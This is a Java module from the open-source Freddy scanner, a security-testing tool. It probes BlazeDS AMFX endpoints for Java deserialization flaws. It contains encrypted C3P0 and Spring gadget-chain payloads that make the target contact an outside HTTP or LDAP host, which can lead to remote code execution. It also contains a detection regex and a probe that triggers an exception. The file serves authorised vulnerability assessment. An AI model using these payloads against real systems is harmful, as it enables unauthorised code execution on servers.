// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the AMX X format support of the Java
 * BlazeDS library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BlazeDSAMFXModule extends FreddyModuleBase {
    //C3P0WrapperConnPool payload data
    private final String C3P0WRAP_PREFIX = decrypt("21ECI++gRLWho4/vDf63WysIFmoKN1dNDoPBm+1AT+xZKSK+/MUlrN1pHnJT6r7032AQmmOkzE1gM53L6HWDMmUN1+BBN0LNNVUE9FPwpxsZQXyjKKJEnDDog6FH1TyQwcx0urSWRw7Db1MmaH1WYaZqP9/ErcmiyeqzLi/dPdI/oWu0KpEMtA8NUemQ/mxUGehjvmgKWCTAzobz6og+TeWQfTviF/qZ8SxyX+aZQNXp+x8QK/cj1/LFjibtVy/jb41Qk54xxiahphTh2QUlmr5CPYCCNNaHpVfRlc0+L3xchENrOAGloQazZtJq06A1Ym2+Bd97593iAIEQJfmVeLxD6gEukLPQv1wr3EOLo1APaZ3BBllHExUbq/GJk5YgQ+i6RqUYc3MQJWVDONVv3L1gdHJLjuolJgATURaMVTuo1qGqGkCKlUUinnbEPFNJzzDaWxvX4E/Hra7Ir7u/IoVj3qZAEmIdWoI0fB76ybEvrPQE82GMoGEIYVjdglBrIr3jCyTcUAwcVKaykNvjjV51yik/hKSgd3SuH76Ragqx81xcQkLK5oEKx+oE7SOvRu1fphFR1Sss4buqZogAOjuBqJaxlOvkhAgNE7gVPFUT+uY9bgCx5FIRe5ewnkayhQxiQ9z63+xjhcpSz8/XZhrSah1JnMd4zLOqf/t08VFkLgiWERFBjwL6JNTYuPn8YeuH0hE6L+nufuwmHyMkhgZAvE0hqqIb+D5Pfp60HCIEkn3imilBxTJRpCsZ3fMSnf2lIYnzy2+s8YLxk4coRnJ66LFthccUONuQoYLNsGuossC1Jr9d+n1Dwg+GwZAkSVJ/l/qLUG0mjE1iPYCzYYsbxRRz3DsE88wCPEJm9IyMjt2Or4hUnyH/Btx2owyW1wK+OCHREc6QCGI6QwR+6arU6BRi4pzjqoYQn7IGcYf6eRqQMHt4cw4SEc97YY5tswyOFim0oqPcmOyIe40HYVwmNiM7zJUcAc/dFoJTpmxQzAE8uEi7StZOOWW1EQLTJ5K5HvXOKDrxTMr/SGXhwSiFdxL4YWxCK274PxhIC4DL0OE8yCO/h069my3HMiRMExm7v8Ouj9Y9laJGaAdWNdnwbdZZt+T9gQTp/Mu5BKjh3rAKD1l12iZEW8pjispBdqJ5rpryba9SFuLNwrADNd9tkUb1B1QQDGgxpaggPLrdHbtZTaGtPs0+I0oII5n/sb+5jl59FT/GW73T+vlvzA4KyqMcUujd3D/hFRXSgK7G+GWsbUy9VCMv/tfCQ3y4Gev5/G+43LrLcXtHcF3ntfINkrrgEehPGWTo0AAuBzJYBccT5vd6izMhQlCHw06YIAsm/zbcRda2sedJhlXnRsl/HBPL4/kGW2P09oub976rYYAwLU5+ek5cxSqA7LzbaAPXY5pfM5iFHH4Os4EjYozNFKlemNd4SRkTPhmZtC6Vdp/ApJ418V05eORtGSu2xT2KSDIx0ET8uf1ZHReit5bxtrWQi4d99DdkepRNridCOJRvjhzkprcQeIM+cbHH9BK3CmCuPyiFL06Dy7A8nFFuDdCTqAMsv5UcUvZzyaH8KX9YJ8sS2Rq+amGDjs/hOuGhwCUMfx0dHa7VnklKH8QLiTp3/P4AOZVFmzp+bL2E2UzHshhj10+e4izpA5KUIlbipZZFGH46JY3jjcJIwnLRs2XA5Pjxylew58R1r4U=");
    private final String C3P0WRAP_SUFFIX = decrypt("8MY/BEf/B9xaxKwsg6JJtxQpc9KEPtjJs0bvd4L3z5RuUDShW0KCVx/6aX0mswFh");

    //SpringPropertyPathFactory payload data
    private final String SPPF_PREFIX = decrypt("21ECI++gRLWho4/vDf63WysIFmoKN1dNDoPBm+1AT+xZKSK+/MUlrN1pHnJT6r7032AQmmOkzE1gM53L6HWDMmUN1+BBN0LNNVUE9FPwpxtjEf7yqO7Tc39GQA20Loo+ugrvMFAFO1CF7cpAdK8ukIoJfU2OHobkqsNl3KLs9wV7XUdU/55Uzg6q4OZ+kQA95MHJq7ulqHeIJHqSsd2yml80z1izQSSFI5be05ypU8jVk7nFGqKdzgpLP5o4BPfZcSZA5rpjidRBqrxCHDEGBsXaR3dSHcH0I5e4eAxZmgA7s8Oojte13F+AK3fsmWL/yizcIDthy9EWiJVKtgUEqjTncDspKSqpXNU0TYS62Kg=");
    private final String SPPF_MIDDLE = decrypt("d9XQatkUpS+3MMP2GbKWrI7M+3atdrzUPQAalf7s7pUTdr5wetYokjKUgsYXieeTzoWbA4GZ9RA05N0eQ/1nOaylyCPVZMgpC6G0RoV81/9ca46Q7srFT6X4CPGiGWDu/eqSWimYN9mRSQphp11BpndQYzC2J2qJJ3p/aZBa5YcK9x4rmKQEuj40sbrwZtoQ3VAFDuw5Sg9OfmD2l1Usc/pMMY8KbR4paN7rfwkoG4hYWNnM6TBsVIpPVGGuuQnmfW/84Yndb0Qudy6HO0U+c57iIsvMvca+mebYfzYtioyCQKQtK1Q0B4pfMr7FbrqF63q1mZloyM4pr4yZpYwrzw==");
    private final String SPPF_SUFFIX = decrypt("oMcNvNZlZ8O36tP3bnHIJ53o0cMkWoIpmlX9wvY+UCDRL74bxObYWc3wmifTa8AUD4C3+aN0DyTa9CKVBlshtQ==");

    protected void initialiseModule() {
        setName("BlazeDS-AMFX");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Register passive/active scan payloads (passive scan exception indicator is handled by BlazeDSPassiveDetectionModule)
        registerPassiveScanIndicator(Pattern.compile("((<)|(%3c)|(%3C))amfx(( )|(%20)|(\\+))"), IndicatorTarget.REQUEST);

        registerActiveScanExceptionPayload("<?xml version=\"1.0\" encoding=\"utf-8\"?><amfx ver=\"3\"><header name=\"x\"><object type=\"FreddyDeser\"><traits><string>value</string></traits></object></header></amfx>", Pattern.compile("Cannot create class of type ((')|(&#39;))FreddyDeser((')|(&#39;))\\."));

        registerActiveScanCollaboratorPayload(PN_C3P0WCP, false);
        registerActiveScanCollaboratorPayload(PN_SPRINGPPF, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_C3P0WCP:
                return C3P0WRAP_PREFIX + encodeStringToAsciiHex(padString("http://" + hostname + "/", 200)) + C3P0WRAP_SUFFIX;

            case PN_SPRINGPPF:
                return SPPF_PREFIX + padString("ldap://" + hostname + "/", 200) + SPPF_MIDDLE + encodeStringToAsciiHex(padString("ldap://" + hostname + "/", 200)) + SPPF_SUFFIX;
        }
        return null;
    }
}
